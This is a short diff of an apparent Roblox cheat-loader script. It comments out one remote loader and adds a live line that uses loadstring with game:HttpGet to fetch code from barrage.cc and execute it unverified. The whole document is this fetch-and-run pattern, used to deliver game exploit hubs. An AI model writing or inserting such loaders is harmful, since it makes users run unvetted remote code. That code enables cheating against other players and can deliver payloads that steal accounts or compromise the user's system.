@@ -1,1 +1,3 @@
 --loadstring(game:HttpGet("https://mythios.online/api/freemium"))()
+--BARRAGE-LPOS3Z
+loadstring(game:HttpGet("https://barrage.cc/loader"))()
